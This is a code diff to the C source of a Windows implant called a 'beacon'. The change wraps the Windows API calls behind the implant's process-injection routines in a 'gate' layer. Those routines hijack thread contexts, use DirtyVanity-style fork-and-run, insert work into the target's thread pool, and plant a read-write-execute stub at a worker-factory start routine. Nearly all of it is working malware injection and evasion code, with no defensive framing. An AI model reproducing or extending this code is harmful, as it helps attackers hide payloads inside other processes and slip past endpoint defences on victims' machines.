@@ -17,6 +17,7 @@
 #include <stdlib.h>
 #include <stdio.h>
 #include <windows.h>
+#include "beacon_gate.h" /* BeaconGate: gate_* = the API with the gate in front */
 #include "beacon.h"
 #include "commands.h"
 #include "parse.h"
@@ -153,10 +154,10 @@ BOOL inject_via_obfsetthreadcontext_hinted(INJECTCONTEXT * context, LPVOID legit
 
 	ZeroMemory(&c, sizeof(c));
 	c.ContextFlags = CONTEXT_FULL;
-	if (!GetThreadContext(hThread, &c)) {
+	if (!gate_GetThreadContext(hThread, &c)) {
 		spawn_log("obf: FAIL GetThreadContext gle=", (long)GetLastError());
 		TerminateThread(hThread, 0);
-		CloseHandle(hThread);
+		gate_CloseHandle(hThread);
 		return FALSE;
 	}
 	spawn_log("obf: GTC ok orig rip=", (long)c.Rip);
@@ -174,7 +175,7 @@ BOOL inject_via_obfsetthreadcontext_hinted(INJECTCONTEXT * context, LPVOID legit
 		if (ustart == NULL) {
 			spawn_log("obf: FAIL no RtlUserThreadStart", 0x7fffffff);
 			TerminateThread(hThread, 0);
-			CloseHandle(hThread);
+			gate_CloseHandle(hThread);
 			return FALSE;
 		}
 		c.Rcx = (DWORD64)lpStartAddress;
@@ -182,15 +183,15 @@ BOOL inject_via_obfsetthreadcontext_hinted(INJECTCONTEXT * context, LPVOID legit
 		c.Rip = (DWORD64)ustart;
 	}
 
-	if (!SetThreadContext(hThread, &c)) {
+	if (!gate_SetThreadContext(hThread, &c)) {
 		spawn_log("obf: FAIL SetThreadContext gle=", (long)GetLastError());
 		TerminateThread(hThread, 0);
-		CloseHandle(hThread);
+		gate_CloseHandle(hThread);
 		return FALSE;
 	}
 
-	ResumeThread(hThread);
-	CloseHandle(hThread);
+	gate_ResumeThread(hThread);
+	gate_CloseHandle(hThread);
 	spawn_log("obf: resumed, payload=", (long)(long long)lpStartAddress);
 	return TRUE;
 #endif
@@ -436,8 +437,8 @@ void dv_nursery_init(void) {
 		dv_host_pid       = pi.dwProcessId;
 		/* the clone re-opens the host by PID (NtOpenProcess); the parent
 		 * needs no handle. The host lives on as the beacon's home. */
-		CloseHandle(pi.hThread);
-		CloseHandle(pi.hProcess);
+		gate_CloseHandle(pi.hThread);
+		gate_CloseHandle(pi.hProcess);
 	}
 
 	/* the raw-syscall stubs must be resolved in the healthy parent so the
@@ -487,16 +488,16 @@ BOOL inject_dirtyvanity_forkrun(char * dll, int dllen, int offset, char * parame
 	 * in our context - no OpenProcess round trip needed */
 	hc = dv_clone_handle;
 
-	remote = VirtualAllocEx(hc, NULL, (SIZE_T)dllen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-	if (remote == NULL || !WriteProcessMemory(hc, remote, dll, (SIZE_T)dllen, &got) || got != (SIZE_T)dllen) {
+	remote = gate_VirtualAllocEx(hc, NULL, (SIZE_T)dllen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	if (remote == NULL || !gate_WriteProcessMemory(hc, remote, dll, (SIZE_T)dllen, &got) || got != (SIZE_T)dllen) {
 		spawn_log("dv: payload write failed gle=", (long)GetLastError());
 		return FALSE;
 	}
-	VirtualProtectEx(hc, remote, (SIZE_T)dllen, PAGE_EXECUTE_READ, &oldp);
+	gate_VirtualProtectEx(hc, remote, (SIZE_T)dllen, PAGE_EXECUTE_READ, &oldp);
 
 	if (plen > 0) {
-		rparam = VirtualAllocEx(hc, NULL, (SIZE_T)plen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-		if (rparam == NULL || !WriteProcessMemory(hc, rparam, parameter, (SIZE_T)plen, &got) || got != (SIZE_T)plen) {
+		rparam = gate_VirtualAllocEx(hc, NULL, (SIZE_T)plen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+		if (rparam == NULL || !gate_WriteProcessMemory(hc, rparam, parameter, (SIZE_T)plen, &got) || got != (SIZE_T)plen) {
 			spawn_log("dv: param write failed gle=", (long)GetLastError());
 			return FALSE;
 		}
@@ -521,13 +522,13 @@ BOOL inject_dirtyvanity_forkrun(char * dll, int dllen, int offset, char * parame
 	 * Two-phase write: every field lands while go is still 0, then go is
 	 * flipped on its own - the clone cannot wake up on a half-written
 	 * mailbox (go used to be the FIRST byte of a single torn write). */
-	if (!WriteProcessMemory(hc, &dv_mailbox, &mb, sizeof(mb), &got) || got != sizeof(mb)) {
+	if (!gate_WriteProcessMemory(hc, &dv_mailbox, &mb, sizeof(mb), &got) || got != sizeof(mb)) {
 		spawn_log("dv: mailbox write failed gle=", (long)GetLastError());
 		return FALSE;
 	}
 	{
 		LONG go = 1;
-		if (!WriteProcessMemory(hc, &dv_mailbox, &go, sizeof(go), &got) || got != sizeof(go)) {
+		if (!gate_WriteProcessMemory(hc, &dv_mailbox, &go, sizeof(go), &got) || got != sizeof(go)) {
 			spawn_log("dv: mailbox go flip failed gle=", (long)GetLastError());
 			return FALSE;
 		}
@@ -694,7 +695,7 @@ BOOL inject_via_tpdirect(INJECTCONTEXT * context, LPVOID lpStartAddress, LPVOID 
 		/* C-25 live: the randomized-base syscall alloc layer rejects these
 		 * requests inside the patsy (gle=183) - fall back to the plain API */
 		spawn_log("tpdirect: stub syscall alloc failed, api fallback gle=", (long)GetLastError());
-		stub = (unsigned char *)VirtualAllocEx(hProcess, NULL, 0x1000,
+		stub = (unsigned char *)gate_VirtualAllocEx(hProcess, NULL, 0x1000,
 		                                       MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 		if (stub == NULL) {
 			spawn_log("tpdirect: stub alloc failed gle=", (long)GetLastError());
@@ -709,7 +710,7 @@ BOOL inject_via_tpdirect(INJECTCONTEXT * context, LPVOID lpStartAddress, LPVOID 
 	{
 		DWORD sold = 0;
 		if (!beacon_VirtualProtectEx(hProcess, stub, 0x1000, PAGE_EXECUTE_READ, &sold)
-				&& !VirtualProtectEx(hProcess, stub, 0x1000, PAGE_EXECUTE_READ, &sold)) {
+				&& !gate_VirtualProtectEx(hProcess, stub, 0x1000, PAGE_EXECUTE_READ, &sold)) {
 			spawn_log("tpdirect: stub protect failed gle=", (long)GetLastError());
 			return FALSE;
 		}
@@ -717,7 +718,7 @@ BOOL inject_via_tpdirect(INJECTCONTEXT * context, LPVOID lpStartAddress, LPVOID 
 	unsigned char * direct = (unsigned char *)beacon_VirtualAllocEx(hProcess, NULL, 0x60,
 	                                                                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 	if (direct == NULL) {
-		direct = (unsigned char *)VirtualAllocEx(hProcess, NULL, 0x60,
+		direct = (unsigned char *)gate_VirtualAllocEx(hProcess, NULL, 0x60,
 		                                         MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 		if (direct == NULL) {
 			spawn_log("tpdirect: direct alloc failed gle=", (long)GetLastError());
@@ -744,7 +745,7 @@ BOOL inject_via_tpdirect(INJECTCONTEXT * context, LPVOID lpStartAddress, LPVOID 
 	 * lands in its IOCP. Allocating after this point raced the rundll32
 	 * spawnto exit (dead process, gle=5). */
 	if (forkrun) {
-		if (ResumeThread(context->hThread) == (DWORD)-1) {
+		if (gate_ResumeThread(context->hThread) == (DWORD)-1) {
 			spawn_log("tpdirect: ResumeThread failed gle=", (long)GetLastError());
 			return FALSE;
 		}
@@ -802,11 +803,11 @@ BOOL inject_via_tpdirect(INJECTCONTEXT * context, LPVOID lpStartAddress, LPVOID 
 		if (hpid != (ULONG_PTR)pid || hval == 0 || hval > 0xFFFFFFFF)
 			continue;
 		HANDLE dup = NULL;
-		if (!DuplicateHandle(hProcess, (HANDLE)(size_t)hval, me, &dup, 0, FALSE, DUPLICATE_SAME_ACCESS))
+		if (!gate_DuplicateHandle(hProcess, (HANDLE)(size_t)hval, me, &dup, 0, FALSE, DUPLICATE_SAME_ACCESS))
 			continue;
 		posted++;
 		NTSTATUS s2 = pSetIo(dup, direct, NULL, NULL, NULL);
-		CloseHandle(dup);
+		gate_CloseHandle(dup);
 		if (s2 == 0) {
 			accepted++;
 			/* ONE dispatch only: TppCallbackEpilog clears the work
@@ -899,7 +900,7 @@ BOOL inject_via_tpstart_routine_stub(INJECTCONTEXT * context, LPVOID lpStartAddr
 	/* 1. fork&run sequencing: the suspended patsy has no pool yet */
 	int forkrun = context->isSuspended && context->hThread != NULL;
 	if (forkrun) {
-		if (ResumeThread(context->hThread) == (DWORD)-1) {
+		if (gate_ResumeThread(context->hThread) == (DWORD)-1) {
 			spawn_log("tpstartstub: ResumeThread failed gle=", (long)GetLastError());
 			return FALSE;
 		}
@@ -958,7 +959,7 @@ BOOL inject_via_tpstart_routine_stub(INJECTCONTEXT * context, LPVOID lpStartAddr
 		if (hpid != (ULONG_PTR)pid || hval == 0 || hval > 0xFFFFFFFF)
 			continue;
 		HANDLE dup = NULL;
-		if (!DuplicateHandle(hProcess, (HANDLE)(size_t)hval, me, &dup, 0, FALSE, DUPLICATE_SAME_ACCESS))
+		if (!gate_DuplicateHandle(hProcess, (HANDLE)(size_t)hval, me, &dup, 0, FALSE, DUPLICATE_SAME_ACCESS))
 			continue;
 		memset(&info, 0, sizeof(info));
 		ULONG gotlen = 0;
@@ -967,7 +968,7 @@ BOOL inject_via_tpstart_routine_stub(INJECTCONTEXT * context, LPVOID lpStartAddr
 			factory = dup; /* keep it open for the set below */
 			break;
 		}
-		CloseHandle(dup);
+		gate_CloseHandle(dup);
 	}
 	free(hbuf);
 	if (factory == NULL) {
@@ -982,19 +983,19 @@ BOOL inject_via_tpstart_routine_stub(INJECTCONTEXT * context, LPVOID lpStartAddr
 	SIZE_T rgot = 0;
 	if (!beacon_ReadProcessMemory(hProcess, info.StartRoutine, orig, sizeof(orig), &rgot)
 			|| rgot != sizeof(orig)) {
-		if (!ReadProcessMemory(hProcess, info.StartRoutine, orig, sizeof(orig), &rgot)
+		if (!gate_ReadProcessMemory(hProcess, info.StartRoutine, orig, sizeof(orig), &rgot)
 				|| rgot != sizeof(orig)) {
 			spawn_log("tpstartstub: read entry failed gle=", (long)GetLastError());
-			CloseHandle(factory);
+			gate_CloseHandle(factory);
 			return FALSE;
 		}
 	}
 
 	/* 4. flip the page RWX and plant the stub */
 	DWORD oldp = 0;
-	if (!VirtualProtectEx(hProcess, info.StartRoutine, 0x1000, PAGE_EXECUTE_READWRITE, &oldp)) {
+	if (!gate_VirtualProtectEx(hProcess, info.StartRoutine, 0x1000, PAGE_EXECUTE_READWRITE, &oldp)) {
 		spawn_log("tpstartstub: protect failed gle=", (long)GetLastError());
-		CloseHandle(factory);
+		gate_CloseHandle(factory);
 		return FALSE;
 	}
 	unsigned char stub[22];
@@ -1007,14 +1008,14 @@ BOOL inject_via_tpstart_routine_stub(INJECTCONTEXT * context, LPVOID lpStartAddr
 	BOOL wok = beacon_WriteProcessMemory(hProcess, info.StartRoutine, stub, sizeof(stub), &wgot)
 	           && wgot == sizeof(stub);
 	if (!wok) {
-		wok = WriteProcessMemory(hProcess, info.StartRoutine, stub, sizeof(stub), &wgot)
+		wok = gate_WriteProcessMemory(hProcess, info.StartRoutine, stub, sizeof(stub), &wgot)
 		      && wgot == sizeof(stub);
 	}
 	if (!wok) {
 		spawn_log("tpstartstub: stub write failed gle=", (long)GetLastError());
 		DWORD back = 0;
-		VirtualProtectEx(hProcess, info.StartRoutine, 0x1000, oldp, &back);
-		CloseHandle(factory);
+		gate_VirtualProtectEx(hProcess, info.StartRoutine, 0x1000, oldp, &back);
+		gate_CloseHandle(factory);
 		return FALSE;
 	}
 	spawn_log("tpstartstub: stub planted, forcing new worker", 0x7fffffff);
@@ -1023,25 +1024,25 @@ BOOL inject_via_tpstart_routine_stub(INJECTCONTEXT * context, LPVOID lpStartAddr
 	 *    StartRoutine = our stub) */
 	ULONG newmin = info.TotalWorkerCount + 1;
 	NTSTATUS s2 = pSet(factory, 4 /*WorkerFactoryThreadMinimum*/, &newmin, sizeof(newmin));
-	CloseHandle(factory);
+	gate_CloseHandle(factory);
 	if (s2 != 0) {
 		spawn_log("tpstartstub: set thread minimum st=", (long)s2);
 		DWORD back = 0;
-		WriteProcessMemory(hProcess, info.StartRoutine, orig, sizeof(orig), &wgot);
-		VirtualProtectEx(hProcess, info.StartRoutine, 0x1000, oldp, &back);
+		gate_WriteProcessMemory(hProcess, info.StartRoutine, orig, sizeof(orig), &wgot);
+		gate_VirtualProtectEx(hProcess, info.StartRoutine, 0x1000, oldp, &back);
 		return FALSE;
 	}
 
 	/* 6. let the fresh worker start + run the stub, then restore */
 	Sleep(300);
 	wgot = 0;
-	if (!WriteProcessMemory(hProcess, info.StartRoutine, orig, sizeof(orig), &wgot)
+	if (!gate_WriteProcessMemory(hProcess, info.StartRoutine, orig, sizeof(orig), &wgot)
 			|| wgot != sizeof(orig)) {
 		spawn_log("tpstartstub: restore failed gle=", (long)GetLastError());
 	}
 	{
 		DWORD back = 0;
-		VirtualProtectEx(hProcess, info.StartRoutine, 0x1000, oldp, &back);
+		gate_VirtualProtectEx(hProcess, info.StartRoutine, 0x1000, oldp, &back);
 	}
 	spawn_log("tpstartstub: entry restored, armed", 0x7fffffff);
 	return TRUE;
